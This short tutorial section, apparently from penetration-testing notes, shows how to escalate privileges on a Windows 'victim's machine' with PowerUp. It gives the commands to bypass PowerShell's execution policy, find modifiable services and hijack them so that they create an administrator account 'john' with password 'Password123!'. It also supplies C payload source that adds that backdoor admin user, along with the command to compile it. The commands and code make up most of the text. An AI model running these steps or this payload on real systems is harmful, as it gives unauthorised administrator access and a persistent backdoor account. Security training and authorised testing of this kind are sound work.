### PowerUp

Another useful tool to check privilege escalation vector is [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). We can upload it on the victim's machine and then use it to gain knowledge and exploit the privileges misconfiguration on the services. First, we enable the PowerShell scripting capability.

```powershell
powershell -ep bypass
```

Then we enable PowerUp

```powershell
. .\PowerUp.ps1
```

To list modifiable service we use

```powershell
Get-ModifiableServiceFile
```

Once we spot an interesting service, we can try to abuse it with

```powershell
Install-ServiceBinary -Name '<SERVICENAME>'
```

This will create the admin user `john` with password `Password123!`. To log-in with the created user we can restart the service (if we have the correct permissions and PowerUp.ps1 automatically uses the right arguments). Eventually we can restart the machine in order to have all services restarted. We also must notice that if the service require some additional configurations, for example passing a configuration file, the PowerUp.ps1 script will fail and we must exploit manually the privilege escalation, setting the right path to the configurations of the service (eg: mysql).

If we have to manually load a custom exploit into the service we can directly write the C code and compile it for our needs

```c
#include <stdlib.h>

int main ()
{
  int payload;
  
  payload = system ("net user john Password123! /add");
  payload = system ("net localgroup administrators john /add");
  
  return 0;
}
```

And then compile it with

```shell
x86_64-w64-mingw32-gcc payload.c -o payload.exe
```